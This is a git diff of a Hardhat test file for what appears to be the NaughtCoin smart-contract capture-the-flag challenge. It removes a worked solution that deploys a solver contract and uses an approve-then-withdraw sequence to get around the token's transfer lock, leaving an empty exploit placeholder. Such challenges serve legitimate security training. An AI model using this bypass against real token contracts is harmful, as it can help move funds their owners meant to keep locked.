@@ -26,15 +26,7 @@ describe('[Challenge] NaughtCoin', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const NaughtCoinSolverFactory = await ethers.getContractFactory('NaughtCoinSolver', attacker);
-        const NaughtCoinSolver = await NaughtCoinSolverFactory.deploy();
-        let amount = await this.target.balanceOf(attacker.address);
-        console.log(`\t attacker balance before : ${amount}`);
-        console.log(`\t giving allownce for contract...`);
-        let allowanceTX = await this.target.connect(attacker).approve(NaughtCoinSolver.address, amount); await allowanceTX.wait();
-        console.log(`\t allownce : ${await this.target.allowance(attacker.address, NaughtCoinSolver.address)}`);
-        let withdrawTX = await NaughtCoinSolver.connect(attacker).withdraw(this.target.address, amount); await withdrawTX.wait();
-        console.log(`\t attacker balance after  : ${await this.target.balanceOf(attacker.address)}`);
+        
     }).timeout(0);
 
     after(async () => {
